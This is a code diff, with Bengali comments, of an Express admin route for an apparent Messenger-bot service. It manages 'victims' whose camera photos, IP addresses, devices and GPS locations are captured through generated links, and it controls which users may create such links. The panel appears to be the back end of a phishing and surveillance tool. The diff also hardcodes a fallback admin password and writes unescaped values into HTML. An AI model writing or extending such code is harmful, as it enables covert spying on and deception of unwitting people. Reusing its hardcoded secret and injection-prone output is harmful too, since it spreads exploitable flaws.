@@ -6,20 +6,20 @@ const Victim = require('../models/Victim');
 const { sendMessage } = require('../utils/helpers');
 
 // ============================
-// অ্যাডমিন মিডলওয়্যার
+// অ্যাডমিন লগইন চেক (মিডলওয়্যার) - এখন আর ব্যবহার হচ্ছে না, কারণ আমরা নিজেরাই চেক করি
 // ============================
-const isAdmin = (req, res, next) => {
-    if (req.session.isAdmin) return next();
-    res.redirect('/admin');
-};
 
 // ============================
-// লগইন পেজ
+// লগইন পেজ & ড্যাশবোর্ড (রিডাইরেক্ট লুপ ফিক্স)
 // ============================
 router.get('/admin', async (req, res) => {
+    // যদি লগইন করা থাকে, ড্যাশবোর্ড দেখান
     if (req.session.isAdmin) {
-        return res.redirect('/admin?tab=dashboard');
+        // ড্যাশবোর্ড রেন্ডার করুন (নিচের কোডটি কপি করা হয়েছে)
+        return renderDashboard(req, res);
     }
+
+    // লগইন পেজ দেখান
     res.send(`
         <!DOCTYPE html>
         <html>
@@ -125,35 +125,27 @@ router.get('/admin', async (req, res) => {
     `);
 });
 
+// লগইন POST
 router.post('/admin/login', async (req, res) => {
     const config = await Config.findOne({ key: 'bot_config' });
     const adminPass = config ? config.adminPassword : 'Sakib@7890';
     if (req.body.password === adminPass) {
         req.session.isAdmin = true;
-        res.redirect('/admin?tab=dashboard');
+        res.redirect('/admin');
     } else {
         res.redirect('/admin?error=1');
     }
 });
 
+// লগআউট
 router.get('/admin/logout', (req, res) => {
     req.session.destroy();
     res.redirect('/admin');
 });
 
-// ============================
-// হেল্পার: ইউজার ম্যাপ তৈরি (fbId -> firstName)
-// ============================
-async function getUserMap() {
-    const users = await User.find({}, 'fbId firstName');
-    const map = {};
-    users.forEach(u => { map[u.fbId] = u.firstName || 'N/A'; });
-    return map;
-}
-
-// ============================
-// ড্যাশবোর্ড রেন্ডার ফাংশন
-// ============================
+// ================================================================
+// ড্যাশবোর্ড রেন্ডার ফাংশন (রিডাইরেক্ট ছাড়া)
+// ================================================================
 async function renderDashboard(req, res) {
     const activeTab = req.query.tab || 'dashboard';
     const config = await Config.findOne({ key: 'bot_config' });
@@ -185,9 +177,7 @@ async function renderDashboard(req, res) {
         victims = await Victim.find(filter).sort({ timestamp: -1 }).limit(50);
     }
 
-    const userMap = await getUserMap();
-
-    // ইউজার টেবিল (দিন/ঘন্টা/মিনিট ইনপুট সহ)
+    // ইউজার টেবিল
     let userRows = users.map(u => {
         const expiryText = u.permissionExpiresAt ? new Date(u.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
         const isExpired = u.permissionExpiresAt && new Date() > u.permissionExpiresAt;
@@ -197,7 +187,7 @@ async function renderDashboard(req, res) {
             <tr>
                 <td><code class="id-badge">${u.fbId}</code></td>
                 <td>
-                    <form method="POST" action="/admin/update-name" class="name-form" style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+                    <form method="POST" action="/admin/update-name" style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
                         <input type="hidden" name="userId" value="${u.fbId}">
                         <input type="text" name="newName" value="${u.firstName || 'N/A'}" style="padding:4px 8px;border:1px solid #ddd;border-radius:6px;font-size:13px;width:120px;">
                         <button type="submit" class="btn-icon" style="color:#4f46e5;background:transparent;border:none;cursor:pointer;" title="নাম পরিবর্তন"><i class="fas fa-pen"></i></button>
@@ -209,19 +199,28 @@ async function renderDashboard(req, res) {
                 <td style="font-size:12px;color:#6b7280;">${expiryText}</td>
                 <td>
                     <div class="action-group">
-                        <form method="POST" action="/admin/toggle-user" class="toggle-form" style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">
+                        <form method="POST" action="/admin/toggle-user" class="inline-form">
                             <input type="hidden" name="userId" value="${u.fbId}">
                             <input type="hidden" name="action" value="${u.allowed ? 'deny' : 'allow'}">
-                            <input type="number" name="days" placeholder="দিন" min="0" value="0" style="width:50px;padding:4px;border:1px solid #ddd;border-radius:4px;font-size:12px;text-align:center;">
-                            <input type="number" name="hours" placeholder="ঘন্টা" min="0" value="0" style="width:50px;padding:4px;border:1px solid #ddd;border-radius:4px;font-size:12px;text-align:center;">
-                            <input type="number" name="minutes" placeholder="মিনিট" min="0" value="0" style="width:50px;padding:4px;border:1px solid #ddd;border-radius:4px;font-size:12px;text-align:center;">
-                            <button type="submit" class="btn-icon toggle" title="${u.allowed ? 'বাতিল করুন' : 'অনুমোদন দিন'}">
+                            <input type="hidden" name="duration" value="" id="duration_${u.fbId}">
+                            <select name="duration_select" class="duration-select" onchange="document.getElementById('duration_${u.fbId}').value=this.value">
+                                <option value="">স্থায়ী</option>
+                                <option value="1h">১ ঘন্টা</option>
+                                <option value="6h">৬ ঘন্টা</option>
+                                <option value="12h">১২ ঘন্টা</option>
+                                <option value="1d">১ দিন</option>
+                                <option value="7d">৭ দিন</option>
+                                <option value="30d">৩০ দিন</option>
+                                <option value="90d">৯০ দিন</option>
+                                <option value="365d">১ বছর</option>
+                            </select>
+                            <button class="btn-icon toggle" title="${u.allowed ? 'বাতিল করুন' : 'অনুমোদন দিন'}">
                                 <i class="fas ${u.allowed ? 'fa-user-slash' : 'fa-user-check'}"></i>
                             </button>
                         </form>
-                        <form method="POST" action="/admin/delete-user" class="delete-form">
+                        <form method="POST" action="/admin/delete-user" class="inline-form" onsubmit="return confirm('এই ইউজারকে ডিলিট করবেন?');">
                             <input type="hidden" name="userId" value="${u.fbId}">
-                            <button type="submit" class="btn-icon delete" title="ডিলিট"><i class="fas fa-trash-alt"></i></button>
+                            <button class="btn-icon delete" title="ডিলিট"><i class="fas fa-trash-alt"></i></button>
                         </form>
                     </div>
                 </td>
@@ -234,7 +233,7 @@ async function renderDashboard(req, res) {
         const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
         const imgTag = lastImage ? `<img src="data:image/jpeg;base64,${lastImage}" class="victim-thumb" />` : '—';
         const expiryStatus = v.isExpired ? '⛔ এক্সপায়ার' : (v.expiresAt ? new Date(v.expiresAt).toLocaleString('bn-BD') : 'N/A');
-        const creatorName = userMap[v.fbId] || v.creatorName || 'N/A';
+        const creator = v.fbId && v.fbId !== 'unknown' ? `<a href="/admin?tab=users&search=${v.fbId}" style="color:#4f46e5;text-decoration:none;">${v.fbId}</a>` : 'N/A';
         return `
             <tr>
                 <td><code class="id-badge">${v.id}</code></td>
@@ -244,12 +243,12 @@ async function renderDashboard(req, res) {
                 <td>${v.location?.city || v.gpsLocation?.latitude ? '<i class="fas fa-map-pin" style="color:#4f46e5;"></i> হ্যাঁ' : '❌ না'}</td>
                 <td>${v.camera?.length || 0}</td>
                 <td>${imgTag}</td>
-                <td>${creatorName}</td>
+                <td>${creator}</td>
                 <td>
                     <a href="/admin/victim/${v.id}" class="btn-view"><i class="fas fa-eye"></i></a>
-                    <form method="POST" action="/admin/expire-link" class="expire-form" style="display:inline;">
+                    <form method="POST" action="/admin/expire-link" class="inline-form" onsubmit="return confirm('এই লিংকটি এক্সপায়ার করবেন?');">
                         <input type="hidden" name="victimId" value="${v.id}">
-                        <button type="submit" class="btn-icon delete" title="লিংক এক্সপায়ার"><i class="fas fa-clock"></i></button>
+                        <button class="btn-icon delete" title="লিংক এক্সপায়ার"><i class="fas fa-clock"></i></button>
                     </form>
                 </td>
                 <td style="font-size:12px;">${expiryStatus}</td>
@@ -259,7 +258,7 @@ async function renderDashboard(req, res) {
     }).join('');
 
     // ============================================================
-    // HTML রেসপন্স (সম্পূর্ণ ড্যাশবোর্ড – অটো-রিলোড নেই)
+    // HTML রেসপন্স (পূর্ণ ড্যাশবোর্ড)
     // ============================================================
     res.send(`
         <!DOCTYPE html>
@@ -272,140 +271,305 @@ async function renderDashboard(req, res) {
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
             <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
             <style>
+                /* (স্টাইল আগের মতোই, সংক্ষেপে দিচ্ছি) */
                 * { margin:0; padding:0; box-sizing:border-box; }
                 body { font-family: 'Inter', sans-serif; background: #f4f6fa; color: #111827; padding: 24px; }
                 .container { max-width: 1440px; margin: 0 auto; }
                 .header {
-                    display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px;
-                    flex-wrap: wrap; gap: 16px;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-bottom: 32px;
+                    flex-wrap: wrap;
+                    gap: 16px;
                 }
-                .header h1 { font-weight: 600; font-size: 28px; color: #111827; display: flex; align-items: center; gap: 12px; }
+                .header h1 {
+                    font-weight: 600;
+                    font-size: 28px;
+                    color: #111827;
+                    display: flex;
+                    align-items: center;
+                    gap: 12px;
+                }
                 .header h1 i { color: #4f46e5; }
                 .header .logout-btn {
-                    background: #fee2e2; color: #b91c1c; padding: 10px 20px; border-radius: 12px;
-                    text-decoration: none; font-weight: 500; font-size: 14px; display: flex; align-items: center; gap: 8px;
+                    background: #fee2e2;
+                    color: #b91c1c;
+                    padding: 10px 20px;
+                    border-radius: 12px;
+                    text-decoration: none;
+                    font-weight: 500;
+                    font-size: 14px;
+                    transition: 0.2s;
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
                 }
                 .header .logout-btn:hover { background: #fecaca; }
                 .nav-tabs {
-                    display: flex; gap: 8px; background: #ffffff; border-radius: 16px; padding: 6px;
-                    border: 1px solid #eef2f6; margin-bottom: 28px; flex-wrap: wrap;
+                    display: flex;
+                    gap: 8px;
+                    background: #ffffff;
+                    border-radius: 16px;
+                    padding: 6px;
+                    border: 1px solid #eef2f6;
+                    margin-bottom: 28px;
+                    flex-wrap: wrap;
                 }
                 .nav-tabs a {
-                    padding: 10px 24px; border-radius: 12px; font-weight: 500; font-size: 15px;
-                    text-decoration: none; color: #6b7280; transition: 0.2s; display: flex; align-items: center; gap: 8px;
+                    padding: 10px 24px;
+                    border-radius: 12px;
+                    font-weight: 500;
+                    font-size: 15px;
+                    text-decoration: none;
+                    color: #6b7280;
+                    transition: 0.2s;
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
                 }
                 .nav-tabs a:hover { background: #f3f4f6; color: #111827; }
                 .nav-tabs a.active { background: #4f46e5; color: #fff; }
                 .nav-tabs a.active:hover { background: #4338ca; }
                 .stats {
-                    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                    gap: 20px;
                     margin-bottom: 32px;
                 }
                 .stat-card {
-                    background: #ffffff; border-radius: 16px; padding: 20px 24px;
-                    border: 1px solid #eef2f6; display: flex; align-items: center; gap: 16px;
+                    background: #ffffff;
+                    border-radius: 16px;
+                    padding: 20px 24px;
+                    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+                    border: 1px solid #eef2f6;
+                    display: flex;
+                    align-items: center;
+                    gap: 16px;
                 }
                 .stat-card .icon {
-                    font-size: 28px; color: #4f46e5; background: #eef2ff; width: 52px; height: 52px;
-                    display: flex; align-items: center; justify-content: center; border-radius: 14px;
+                    font-size: 28px;
+                    color: #4f46e5;
+                    background: #eef2ff;
+                    width: 52px;
+                    height: 52px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    border-radius: 14px;
                 }
-                .stat-card .info .number { font-size: 26px; font-weight: 700; color: #111827; line-height: 1.2; }
+                .stat-card .info .number {
+                    font-size: 26px;
+                    font-weight: 700;
+                    color: #111827;
+                    line-height: 1.2;
+                }
                 .stat-card .info .label { font-size: 14px; color: #6b7280; }
                 .search-section {
-                    background: #ffffff; border-radius: 16px; padding: 16px 24px; margin-bottom: 24px;
-                    border: 1px solid #eef2f6; display: flex; gap: 12px; align-items: center; flex-wrap: wrap;
+                    background: #ffffff;
+                    border-radius: 16px;
+                    padding: 16px 24px;
+                    margin-bottom: 24px;
+                    border: 1px solid #eef2f6;
+                    display: flex;
+                    gap: 12px;
+                    align-items: center;
+                    flex-wrap: wrap;
                 }
                 .search-section input {
-                    flex: 1; min-width: 200px; padding: 10px 16px; border: 1.5px solid #e5e7eb; border-radius: 10px;
-                    font-size: 14px; font-family: 'Inter', sans-serif; background: #f9fafb;
+                    flex: 1;
+                    min-width: 200px;
+                    padding: 10px 16px;
+                    border: 1.5px solid #e5e7eb;
+                    border-radius: 10px;
+                    font-size: 14px;
+                    font-family: 'Inter', sans-serif;
+                    background: #f9fafb;
                 }
                 .search-section input:focus {
-                    border-color: #4f46e5; background: #ffffff; outline: none; box-shadow: 0 0 0 3px rgba(79,70,229,0.08);
+                    border-color: #4f46e5;
+                    background: #ffffff;
+                    outline: none;
+                    box-shadow: 0 0 0 3px rgba(79,70,229,0.08);
                 }
                 .search-section button {
-                    padding: 10px 24px; background: #4f46e5; color: #fff; border: none; border-radius: 10px;
-                    font-weight: 600; font-size: 14px; cursor: pointer; font-family: 'Inter', sans-serif;
+                    padding: 10px 24px;
+                    background: #4f46e5;
+                    color: #fff;
+                    border: none;
+                    border-radius: 10px;
+                    font-weight: 600;
+                    font-size: 14px;
+                    cursor: pointer;
+                    font-family: 'Inter', sans-serif;
                     transition: 0.2s;
                 }
                 .search-section button:hover { background: #4338ca; }
                 .search-section .clear-btn {
-                    background: #e5e7eb; color: #374151; text-decoration: none; padding: 10px 20px;
-                    border-radius: 10px; font-weight: 500; font-size: 14px;
+                    background: #e5e7eb;
+                    color: #374151;
                 }
                 .search-section .clear-btn:hover { background: #d1d5db; }
                 .card {
-                    background: #ffffff; border-radius: 20px; padding: 24px 28px; margin-bottom: 28px;
-                    border: 1px solid #eef2f6; box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+                    background: #ffffff;
+                    border-radius: 20px;
+                    padding: 24px 28px;
+                    margin-bottom: 28px;
+                    border: 1px solid #eef2f6;
+                    box-shadow: 0 2px 8px rgba(0,0,0,0.03);
                 }
                 .card-header {
-                    display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px;
-                    flex-wrap: wrap; gap: 12px;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-bottom: 18px;
+                    flex-wrap: wrap;
+                    gap: 12px;
                 }
                 .card-header h2 {
-                    font-weight: 600; font-size: 18px; color: #111827; display: flex; align-items: center; gap: 10px;
+                    font-weight: 600;
+                    font-size: 18px;
+                    color: #111827;
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
                 }
                 .card-header h2 i { color: #4f46e5; }
                 .card-header .badge {
-                    background: #eef2ff; color: #4f46e5; font-size: 13px; font-weight: 500;
-                    padding: 4px 14px; border-radius: 30px;
+                    background: #eef2ff;
+                    color: #4f46e5;
+                    font-size: 13px;
+                    font-weight: 500;
+                    padding: 4px 14px;
+                    border-radius: 30px;
                 }
                 .table-wrap { overflow-x: auto; border-radius: 12px; }
                 table { width: 100%; border-collapse: collapse; font-size: 14px; }
                 th {
-                    text-align: left; padding: 12px 10px; font-weight: 600; color: #4b5563;
-                    border-bottom: 2px solid #e5e7eb; background: #f9fafb;
+                    text-align: left;
+                    padding: 12px 10px;
+                    font-weight: 600;
+                    color: #4b5563;
+                    border-bottom: 2px solid #e5e7eb;
+                    background: #f9fafb;
                 }
                 td { padding: 12px 10px; border-bottom: 1px solid #f3f4f6; vertical-align: middle; }
                 tr:last-child td { border-bottom: none; }
                 .id-badge {
-                    background: #f3f4f6; padding: 4px 10px; border-radius: 30px;
-                    font-size: 12px; font-weight: 500; color: #374151;
+                    background: #f3f4f6;
+                    padding: 4px 10px;
+                    border-radius: 30px;
+                    font-size: 12px;
+                    font-weight: 500;
+                    color: #374151;
                 }
-                .status-badge { padding: 4px 14px; border-radius: 30px; font-size: 12px; font-weight: 500; }
+                .status-badge {
+                    padding: 4px 14px;
+                    border-radius: 30px;
+                    font-size: 12px;
+                    font-weight: 500;
+                }
                 .status-badge.allowed { background: #d1fae5; color: #065f46; }
                 .status-badge.denied { background: #fee2e2; color: #991b1b; }
                 .status-badge.expired { background: #fef3c7; color: #92400e; }
-                .type-badge { padding: 4px 12px; border-radius: 30px; font-size: 12px; font-weight: 500; }
+                .type-badge {
+                    padding: 4px 12px;
+                    border-radius: 30px;
+                    font-size: 12px;
+                    font-weight: 500;
+                }
                 .type-badge.camera { background: #dbeafe; color: #1e40af; }
                 .type-badge.location { background: #e0e7ff; color: #3730a3; }
                 .type-badge.fb { background: #fce7f3; color: #9d174d; }
                 .type-badge.wp { background: #d1fae5; color: #065f46; }
                 .victim-thumb {
-                    width: 44px; height: 44px; object-fit: cover; border-radius: 10px; border: 1px solid #e5e7eb;
+                    width: 44px;
+                    height: 44px;
+                    object-fit: cover;
+                    border-radius: 10px;
+                    border: 1px solid #e5e7eb;
                 }
-                .action-group { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
+                .action-group {
+                    display: flex;
+                    gap: 6px;
+                    flex-wrap: wrap;
+                    align-items: center;
+                }
                 .inline-form { display: inline; }
                 .btn-icon {
-                    background: transparent; border: none; cursor: pointer; padding: 6px 10px;
-                    border-radius: 8px; font-size: 16px; transition: 0.2s;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    padding: 6px 10px;
+                    border-radius: 8px;
+                    font-size: 16px;
+                    transition: 0.2s;
                 }
                 .btn-icon.toggle { color: #4f46e5; }
                 .btn-icon.toggle:hover { background: #eef2ff; }
                 .btn-icon.delete { color: #dc2626; }
                 .btn-icon.delete:hover { background: #fee2e2; }
                 .btn-view {
-                    color: #4f46e5; text-decoration: none; padding: 6px 12px; border-radius: 8px;
-                    background: #eef2ff; font-size: 14px; transition: 0.2s;
+                    color: #4f46e5;
+                    text-decoration: none;
+                    padding: 6px 12px;
+                    border-radius: 8px;
+                    background: #eef2ff;
+                    font-size: 14px;
+                    transition: 0.2s;
                 }
                 .btn-view:hover { background: #dbeafe; }
+                .duration-select {
+                    padding: 4px 6px;
+                    border: 1px solid #ddd;
+                    border-radius: 6px;
+                    font-size: 12px;
+                    background: #f9fafb;
+                    font-family: 'Inter', sans-serif;
+                }
                 .config-grid {
-                    display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+                    display: grid;
+                    grid-template-columns: 1fr 1fr;
+                    gap: 16px;
                 }
                 .config-grid .full { grid-column: 1 / -1; }
                 .config-grid label {
-                    font-weight: 500; font-size: 13px; color: #4b5563; display: block; margin-bottom: 4px;
+                    font-weight: 500;
+                    font-size: 13px;
+                    color: #4b5563;
+                    display: block;
+                    margin-bottom: 4px;
                 }
                 .config-grid input, .config-grid textarea {
-                    width: 100%; padding: 10px 14px; border: 1.5px solid #e5e7eb; border-radius: 10px;
-                    font-family: 'Inter', sans-serif; font-size: 14px; background: #f9fafb; transition: 0.2s;
+                    width: 100%;
+                    padding: 10px 14px;
+                    border: 1.5px solid #e5e7eb;
+                    border-radius: 10px;
+                    font-family: 'Inter', sans-serif;
+                    font-size: 14px;
+                    background: #f9fafb;
+                    transition: 0.2s;
                 }
                 .config-grid input:focus, .config-grid textarea:focus {
-                    border-color: #4f46e5; background: #ffffff; outline: none; box-shadow: 0 0 0 4px rgba(79,70,229,0.08);
+                    border-color: #4f46e5;
+                    background: #ffffff;
+                    outline: none;
+                    box-shadow: 0 0 0 4px rgba(79,70,229,0.08);
                 }
                 .btn-primary {
-                    background: #4f46e5; color: #fff; border: none; padding: 10px 24px; border-radius: 12px;
-                    font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.2s;
-                    display: inline-flex; align-items: center; gap: 8px; font-family: 'Inter', sans-serif;
+                    background: #4f46e5;
+                    color: #fff;
+                    border: none;
+                    padding: 10px 24px;
+                    border-radius: 12px;
+                    font-weight: 600;
+                    font-size: 14px;
+                    cursor: pointer;
+                    transition: 0.2s;
+                    display: inline-flex;
+                    align-items: center;
+                    gap: 8px;
+                    font-family: 'Inter', sans-serif;
                 }
                 .btn-primary:hover { background: #4338ca; }
                 .text-muted { color: #9ca3af; }
@@ -429,6 +593,7 @@ async function renderDashboard(req, res) {
                     <a href="/admin/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> লগআউট</a>
                 </div>
 
+                <!-- Navigation Tabs -->
                 <div class="nav-tabs">
                     <a href="/admin?tab=dashboard" class="${activeTab === 'dashboard' ? 'active' : ''}"><i class="fas fa-chart-pie"></i> ড্যাশবোর্ড</a>
                     <a href="/admin?tab=users" class="${activeTab === 'users' ? 'active' : ''}"><i class="fas fa-users"></i> ইউজার</a>
@@ -440,10 +605,22 @@ async function renderDashboard(req, res) {
                 ${activeTab === 'dashboard' ? `
                 <div id="dashboard">
                     <div class="stats">
-                        <div class="stat-card"><div class="icon"><i class="fas fa-users"></i></div><div class="info"><div class="number">${totalUsers}</div><div class="label">মোট ইউজার</div></div></div>
-                        <div class="stat-card"><div class="icon"><i class="fas fa-user-check"></i></div><div class="info"><div class="number">${allowedUsers}</div><div class="label">অনুমোদিত</div></div></div>
-                        <div class="stat-card"><div class="icon"><i class="fas fa-user-secret"></i></div><div class="info"><div class="number">${totalVictims}</div><div class="label">মোট ভিক্টিম</div></div></div>
-                        <div class="stat-card"><div class="icon"><i class="fas fa-camera"></i></div><div class="info"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div class="label">ছবি ক্যাপচার</div></div></div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-users"></i></div>
+                            <div class="info"><div class="number">${totalUsers}</div><div class="label">মোট ইউজার</div></div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-user-check"></i></div>
+                            <div class="info"><div class="number">${allowedUsers}</div><div class="label">অনুমোদিত</div></div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-user-secret"></i></div>
+                            <div class="info"><div class="number">${totalVictims}</div><div class="label">মোট ভিক্টিম</div></div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-camera"></i></div>
+                            <div class="info"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div class="label">ছবি ক্যাপচার</div></div>
+                        </div>
                     </div>
                     <div class="card">
                         <div class="card-header"><h2><i class="fas fa-clock"></i> সাম্প্রতিক ভিক্টিম (সর্বশেষ ৫টি)</h2></div>
@@ -456,7 +633,7 @@ async function renderDashboard(req, res) {
                                             <td><code class="id-badge">${v.id}</code></td>
                                             <td><span class="type-badge ${v.type}">${v.type}</span></td>
                                             <td>${v.ip || 'N/A'}</td>
-                                            <td>${userMap[v.fbId] || v.creatorName || 'N/A'}</td>
+                                            <td>${v.fbId && v.fbId !== 'unknown' ? `<a href="/admin?tab=users&search=${v.fbId}" style="color:#4f46e5;text-decoration:none;">${v.fbId}</a>` : 'N/A'}</td>
                                             <td>${new Date(v.timestamp).toLocaleDateString('bn-BD')}</td>
                                         </tr>
                                     `).join('') || '<tr><td colspan="5" style="text-align:center;color:#9ca3af;padding:20px;">কোনো ভিক্টিম নেই</td></tr>'}
@@ -476,14 +653,19 @@ async function renderDashboard(req, res) {
                             <input type="hidden" name="tab" value="users">
                             <input type="text" name="search" placeholder="Facebook ID দিয়ে ইউজার খুঁজুন..." value="${search}">
                             <button type="submit"><i class="fas fa-search"></i> খুঁজুন</button>
-                            ${search ? `<a href="/admin?tab=users" class="clear-btn">সাফ করুন</a>` : ''}
+                            ${search ? `<a href="/admin?tab=users" class="clear-btn" style="padding:10px 20px;background:#e5e7eb;color:#374151;border-radius:10px;text-decoration:none;font-weight:500;font-size:14px;">সাফ করুন</a>` : ''}
                         </form>
                     </div>
                     <div class="card">
-                        <div class="card-header"><h2><i class="fas fa-address-book"></i> ইউজার লিস্ট</h2><span class="badge">${users.length} জন</span></div>
+                        <div class="card-header">
+                            <h2><i class="fas fa-address-book"></i> ইউজার লিস্ট</h2>
+                            <span class="badge">${users.length} জন</span>
+                        </div>
                         <div class="table-wrap">
                             <table>
-                                <thead><tr><th>FB ID</th><th>নাম</th><th>প্রথম দেখা</th><th>মেসেজ</th><th>স্ট্যাটাস</th><th>এক্সপাইরি</th><th>অ্যাকশন</th></tr></thead>
+                                <thead><tr>
+                                    <th>FB ID</th><th>নাম</th><th>প্রথম দেখা</th><th>মেসেজ</th><th>স্ট্যাটাস</th><th>এক্সপাইরি</th><th>অ্যাকশন</th>
+                                </tr></thead>
                                 <tbody>${userRows || '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ইউজার নেই</td></tr>'}</tbody>
                             </table>
                         </div>
@@ -500,20 +682,25 @@ async function renderDashboard(req, res) {
                             <input type="hidden" name="tab" value="victims">
                             <input type="text" name="search" placeholder="ভিক্টিম ID বা নির্মাতার FB ID দিয়ে খুঁজুন..." value="${search}">
                             <button type="submit"><i class="fas fa-search"></i> খুঁজুন</button>
-                            ${search ? `<a href="/admin?tab=victims" class="clear-btn">সাফ করুন</a>` : ''}
+                            ${search ? `<a href="/admin?tab=victims" class="clear-btn" style="padding:10px 20px;background:#e5e7eb;color:#374151;border-radius:10px;text-decoration:none;font-weight:500;font-size:14px;">সাফ করুন</a>` : ''}
                         </form>
                     </div>
                     <div class="card">
-                        <div class="card-header"><h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2><span class="badge">${victims.length}টি</span></div>
+                        <div class="card-header">
+                            <h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2>
+                            <span class="badge">${victims.length}টি</span>
+                        </div>
                         <div class="table-wrap">
                             <table>
-                                <thead><tr><th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>ডিভাইস</th><th>লোকেশন</th><th>ছবি</th><th>প্রিভিউ</th><th>নির্মাতা</th><th>অ্যাকশন</th><th>এক্সপাইরি</th><th>সময়</th></tr></thead>
+                                <thead><tr>
+                                    <th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>ডিভাইস</th><th>লোকেশন</th><th>ছবি</th><th>প্রিভিউ</th>
+                                    <th>নির্মাতা</th><th>অ্যাকশন</th><th>এক্সপাইরি</th><th>সময়</th>
+                                </tr></thead>
                                 <tbody>${victimRows || '<tr><td colspan="11" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ভিক্টিম নেই</td></tr>'}</tbody>
                             </table>
                         </div>
                         <div style="margin-top:16px;font-size:13px;color:#6b7280;">
-                            <i class="fas fa-info-circle"></i> বিস্তারিত দেখতে "দেখুন" বাটনে ক্লিক করুন।
-                            <i class="fas fa-clock" style="margin-left:12px;"></i> ঘড়ি আইকনে ক্লিক করে লিংক এক্সপায়ার করুন।
+                            <i class="fas fa-info-circle"></i> বিস্তারিত দেখতে "দেখুন" বাটনে ক্লিক করুন। <i class="fas fa-clock" style="margin-left:12px;"></i> ঘড়ি আইকনে ক্লিক করে লিংক এক্সপায়ার করুন।
                         </div>
                     </div>
                 </div>
@@ -524,7 +711,7 @@ async function renderDashboard(req, res) {
                 <div id="config">
                     <div class="card">
                         <div class="card-header"><h2><i class="fas fa-sliders-h"></i> কনফিগারেশন</h2><span class="badge">প্রয়োজনীয়</span></div>
-                        <form method="POST" action="/admin/update-config" class="config-form">
+                        <form method="POST" action="/admin/update-config">
                             <div class="config-grid">
                                 <div><label><i class="fas fa-key" style="margin-right:6px;color:#4f46e5;"></i> পেজ অ্যাক্সেস টোকেন</label><input type="text" name="pageAccessToken" value="${config?.pageAccessToken || ''}" placeholder="PAGE_ACCESS_TOKEN"></div>
                                 <div><label><i class="fas fa-shield-alt" style="margin-right:6px;color:#4f46e5;"></i> ভেরিফাই টোকেন</label><input type="text" name="verifyToken" value="${config?.verifyToken || 'Sakib_Verify'}" placeholder="VERIFY_TOKEN"></div>
@@ -533,23 +720,22 @@ async function renderDashboard(req, res) {
                                 <div class="full"><button type="submit" class="btn-primary"><i class="fas fa-save"></i> কনফিগ সেভ</button></div>
                             </div>
                         </form>
-                        <div style="margin-top:16px;padding-top:16px;border-top:1px solid #eef2f6;">
-                            <code style="background:#f3f4f6;padding:4px 14px;border-radius:30px;font-size:13px;">📌 ওয়েবহুক URL: ${baseUrl}/webhook</code>
-                        </div>
+                        <div style="margin-top:16px;padding-top:16px;border-top:1px solid #eef2f6;"><code style="background:#f3f4f6;padding:4px 14px;border-radius:30px;font-size:13px;">📌 ওয়েবহুক URL: ${baseUrl}/webhook</code></div>
                     </div>
                 </div>
                 ` : ''}
             </div>
 
             <!-- ============================================================ -->
-            <!-- কাস্টম পপআপ (সব অ্যাকশনে কনফর্ম) + অটো-রিলোড বাদ -->
+            <!-- পোলিং স্ক্রিপ্ট (প্রতি ১০ সেকেন্ডে রিলোড) + কাস্টম পপআপ -->
             <!-- ============================================================ -->
             <script>
                 (function() {
                     const activeTab = "${activeTab}";
+
+                    // পপআপ দেখানোর জন্য (যদি msg বা error থাকে)
                     const msg = "${msg}";
                     const error = "${error}";
-
                     if (msg) {
                         Swal.fire({
                             icon: 'success',
@@ -569,128 +755,22 @@ async function renderDashboard(req, res) {
                         });
                     }
 
-                    // ---------- সব ফর্মের জন্য কনফর্ম পপআপ ----------
-                    document.addEventListener('submit', function(e) {
-                        const form = e.target;
+                    // রিয়েল-টাইম আপডেট (পোলিং)
+                    if (activeTab === 'users' || activeTab === 'victims' || activeTab === 'dashboard') {
+                        setInterval(function() {
+                            // পুরো পেজ রিলোড (সহজ উপায়)
+                            location.reload();
+                        }, 10000); // ১০ সেকেন্ড
+                    }
 
-                        // টগল ফর্ম (অনুমোদন/বাতিল) – দিন/ঘন্টা/মিনিট সহ
-                        if (form.classList.contains('toggle-form')) {
-                            e.preventDefault();
-                            const action = form.querySelector('input[name="action"]').value;
-                            const isAllow = action === 'allow';
-                            const days = parseInt(form.querySelector('input[name="days"]').value) || 0;
-                            const hours = parseInt(form.querySelector('input[name="hours"]').value) || 0;
